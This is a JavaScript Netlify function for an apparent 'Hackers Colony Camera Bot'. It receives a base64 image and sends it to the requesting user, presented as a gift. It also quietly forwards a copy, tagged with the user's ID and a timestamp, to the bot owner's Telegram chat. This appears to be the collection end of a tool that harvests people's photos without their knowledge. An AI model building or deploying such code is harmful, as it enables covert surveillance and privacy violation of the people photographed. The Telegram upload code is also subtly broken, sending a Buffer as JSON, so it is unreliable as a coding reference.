// netlify/functions/sendPhoto.js
const axios = require('axios');

exports.handler = async function(event, context) {
  // Only allow POST requests
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: JSON.stringify({ error: 'Method Not Allowed' })
    };
  }

  try {
    // Parse the request body
    const { image, label, userId } = JSON.parse(event.body);
    
    // Get tokens from environment variables
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const OWNER_ID = process.env.OWNER_ID;

    if (!BOT_TOKEN || !OWNER_ID) {
      console.error('Environment variables not set');
      throw new Error('Server configuration error');
    }

    // Convert base64 to buffer
    const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');

    // Send to user
    await sendToTelegram(BOT_TOKEN, userId, buffer, label, true);
    
    // Send to owner
    await sendToTelegram(BOT_TOKEN, OWNER_ID, buffer, label, false, userId);

    return {
      statusCode: 200,
      body: JSON.stringify({ 
        success: true, 
        message: 'Photos sent!' 
      })
    };

  } catch (error) {
    console.error('Error:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ 
        success: false, 
        error: error.message 
      })
    };
  }
};

async function sendToTelegram(token, chatId, photoBuffer, label, isUser = true, userId = null) {
  let caption = '';
  
  if (isUser) {
    // Message to the user
    caption = `🎁 Your Gift: ${label}\n✨ From Hackers Colony Camera Bot`;
  } else {
    // Message to you (owner)
    caption = `📸 From User ${userId}: ${label}\n⏰ ${new Date().toLocaleTimeString()}`;
  }

  try {
    // Send to Telegram
    const response = await axios.post(
      `https://api.telegram.org/bot${token}/sendPhoto`,
      {
        chat_id: chatId,
        caption: caption,
        photo: photoBuffer
      },
      {
        headers: {
          'Content-Type': 'application/json'
        }
      }
    );
    
    console.log(`Photo sent to ${chatId}:`, response.data);
  } catch (error) {
    console.error('Telegram API error:', error.response?.data || error.message);
    throw error;
  }
}
